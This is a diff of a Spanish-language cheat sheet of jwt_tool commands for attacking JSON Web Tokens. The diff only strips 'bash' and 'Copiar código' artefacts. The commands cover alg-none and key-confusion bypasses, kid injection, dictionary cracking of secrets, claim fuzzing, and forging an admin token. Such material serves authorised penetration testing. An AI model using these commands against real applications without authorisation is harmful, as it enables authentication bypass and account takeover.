@@ -6,9 +6,7 @@ Esta prueba busca explotar implementaciones incorrectas del algoritmo `alg`, en 
 
 **Comando:**
 
-bash
 
-Copiar código
 
 `python3 jwt_tool.py <JWT> -X a`
 
@@ -20,9 +18,6 @@ Esta vulnerabilidad surge cuando una aplicación acepta la clave pública como s
 
 **Comando:**
 
-bash
-
-Copiar código
 
 `python3 jwt_tool.py <JWT> -X c`
 
@@ -34,9 +29,7 @@ Si la aplicación usa `kid` para seleccionar la clave para la verificación de l
 
 **Comando:**
 
-bash
 
-Copiar código
 
 `python3 jwt_tool.py <JWT> -I -hc kid -hv "<your_kid_value>" -X i`
 
@@ -48,9 +41,6 @@ Este ataque intenta descubrir claves débiles usando un ataque de diccionario. E
 
 **Comando:**
 
-bash
-
-Copiar código
 
 `python3 jwt_tool.py <JWT> -S -d /ruta/del/diccionario.txt`
 
@@ -62,9 +52,7 @@ Puedes realizar fuzzing sobre diferentes claves del payload para detectar compor
 
 **Comando:**
 
-bash
 
-Copiar código
 
 `python3 jwt_tool.py <JWT> -I -hc <claim_name> -hf <fuzzing_file.txt>`
 
@@ -76,9 +64,7 @@ Puedes manipular las marcas de tiempo (`iat`, `exp`, `nbf`) para probar si la ap
 
 **Comando:**
 
-bash
 
-Copiar código
 
 `python3 jwt_tool.py <JWT> -I -hc iat -hv <new_iat_value>`
 
@@ -90,9 +76,7 @@ Utiliza el modo de escaneo del playbook para realizar una evaluación automátic
 
 **Comando:**
 
-bash
 
-Copiar código
 
 `python3 jwt_tool.py -t https://example.com -rc "jwt=<JWT>" -M pb`
 
@@ -104,9 +88,7 @@ Si tienes acceso a una clave pública o un secreto compartido, puedes intentar v
 
 **Comando:**
 
-bash
 
-Copiar código
 
 `python3 jwt_tool.py <JWT> -V -pk /ruta/a/clave_publica.pem`
 
@@ -118,9 +100,7 @@ Puedes generar tu propio token personalizado y firmarlo usando una clave privada
 
 **Comando:**
 
-bash
 
-Copiar código
 
 `python3 jwt_tool.py -C -pk /ruta/a/clave_privada.pem -P '{"sub":"admin"}'`
 
